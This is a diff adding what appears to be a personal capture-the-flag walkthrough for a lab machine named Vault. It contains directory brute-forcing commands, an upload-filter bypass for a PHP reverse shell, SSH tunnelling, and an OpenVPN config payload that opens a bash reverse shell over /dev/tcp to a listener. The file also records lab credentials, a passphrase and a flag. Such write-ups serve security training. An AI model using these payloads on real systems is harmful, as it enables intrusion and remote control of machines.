@@ -1,0 +1,107 @@
+#10.10.10.109
+#PORT- 22, 80
+
+#nmap
+
+#visit : http://10.10.10.109/
+#Guess the directory:  http://10.10.10.109/sparklays/
+
+#gobuster on /sparklays   -->   /admin.php , /login.php , /design/  
+gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+
+#gobuster  on /sparklays/design   -->   /design.html  , /uploads/
+gobuster -u http://10.10.10.109/sparklays/design/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+
+
+#uploade php reverse shell(phpshell.php5) on:
+http://10.10.10.109/sparklays/design/design.html
+#using .php5 to bypass the filter for file extension
+#listen on port 1337
+#trigger it from 
+http://10.10.10.109/sparklays/design/uploads/phpshell.php5
+
+----------------------------------------------------
+#INSIDE LOCAL SHELL
+----------------------------------------------------
+#users = alex, dave
+#inside /home/alex/Downloads = server.iso
+#inside /home/dave/Desktop found files 'Server', 'key', 'ssh'
+---------------------------
+#inside 'Server' file
+DNS + Configurator - 192.168.122.4       //ssh tunnel ip
+Firewall - 192.168.122.5		
+The Vault - x
+---------------------------
+#inside 'ssh' file
+#found ssh cred
+#USER= dave	    (cred for 'dave@ubuntu')	
+#PASSWD= Dav3therav3123
+----------------------------
+#inside 'key' file
+itscominghome		(passphrase for 'root.txt.gpg')
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+------------------------------------------------------------------------
+#INSIDE 1st SSH PORT FORWARDING
+------------------------------------------------------------------------
+#understand tunneling (ssh port forwarding)
+>>>https://www.youtube.com/watch?v=ngbSsMAYYsE
+>>>https://www.ssh.com/ssh/tunneling/example
+>>>https://netsec.ws/?p=278
+
+#connect to 'dave@ubuntu' user using tunnenling 
+#run this on local terminal
+ssh -L 4444:192.168.122.4:80 dave@10.10.10.109
+#PASSWD= Dav3therav3123
+
+#start ssh service on your local machine
+service ssh start
+#now do port forwarding to your local machine from 'dave@ubuntu'
+ssh -R 9999:192.168.122.4:80 ash@10.10.15.103
+#now open webpage on browser
+http://localhost:4444
+#change vpn configuration
+#Google = ovpn reverse shell
+https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da
+
+#enter these onto webpage(http://localhost:4444) ovpn content field
+**********************************
+remote 192.168.122.1
+dev tun
+nobind
+script-security 2
+up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/2323 0>&1'"
+**********************************
+
+#before executing this open new local terminal and connect to 'dave@ubuntu' user again
+ssh -L 4444:192.168.122.4:80 dave@10.10.10.109
+#PASSWD= Dav3therav3123
+
+
+---------------------------------------------------------
+#INSIDE 2nd SSH PORT FORWARDING
+---------------------------------------------------------
+#start listener on port 2323
+nc -nlvp 2323
+
+
+#got shell 'root@DNS' on 2nd ssh port forwardimg terminal
+#got key inside /home/dave/user.txt
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+#key
+a4947faa8d4e1f80771d34234bd88c73
+
+
+
+*************************************************************
+#MACHINE HEIRARCY
+1. www-data	10.10.10.109
+2. dave@ubuntu  10.10.10.109  & bridged to  192.168.122.1
+3. dave@DNS     192.168.122.4
+4. dave@Vault   192.168.5.2
+*************************************************************
+
